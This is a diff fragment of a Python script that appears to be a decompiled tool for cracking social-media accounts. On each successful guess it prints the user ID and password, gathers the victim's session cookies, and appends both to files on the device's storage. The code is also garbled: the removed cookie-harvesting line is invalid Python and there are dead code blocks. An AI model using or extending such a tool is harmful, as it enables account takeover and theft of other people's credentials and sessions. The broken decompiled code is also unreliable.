@@ -918,8 +918,6 @@ def m1(idf,pwv):
                 if str(uid) in oks:
                     '1'
                 print('\r\r\x1b[1;32m [Q_T_9-OK] ' + str(uid) + ' | ' + pas + '\x1b[1;97m')
-                coki = (lambda .0: for i in .0:
-i['name'] + '=' + i['value']None)(po['session_cookies']())
                 open('/sdcard/Q_T_9-COOKIE.txt', 'a').write(coki + '\n')
                 open('/sdcard/Q_T_9_OK.txt', 'a').write(str(uid) + '|' + pas + '\n')
                 oks.append(str(uid))
@@ -935,15 +933,6 @@ i['name'] + '=' + i['value']None)(po['session_cookies']())
                 cps.append(str(ids))
                 '?1'
             loop += 1
-            return None
-            if Exception:
-                e = 'sec-fetch-user'
-                e = None
-                del e
-                return None
-            e = 'sec-fetch-user'
-            del e
-
 
 def m2(idf,pwv):
  global loop,ok,cp
